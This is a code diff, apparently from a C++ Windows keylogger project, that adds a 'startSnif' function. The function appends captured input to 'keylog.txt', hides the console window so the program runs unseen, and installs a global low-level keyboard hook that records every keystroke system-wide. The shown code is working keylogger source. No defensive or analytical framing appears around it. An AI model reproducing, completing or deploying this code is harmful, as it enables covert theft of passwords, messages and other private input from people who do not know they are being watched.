@@ -232,6 +232,26 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 	return CallNextHookEx(hook, nCode, wParam, lParam);
 }
 
+void startSnif()
+{
+	checkfile.open("keylog.txt");
+	if (checkfile.peek() == EOF)
+		firstLineExist = false;
+	checkfile.close();
+
+	file.open("keylog.txt", ios_base::app);
+	//setlocale(LC_ALL, "Russian");
+	ShowWindow(FindWindowA("ConsoleWindowsClass", NULL), 0);
+
+	MSG message;
+
+	SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);
+
+	while (true)
+	{
+		GetMessage(&message, NULL, 0, 0);
+	}
+}
 
 DWORD WINAPI callCSharp(LPVOID t)
 {
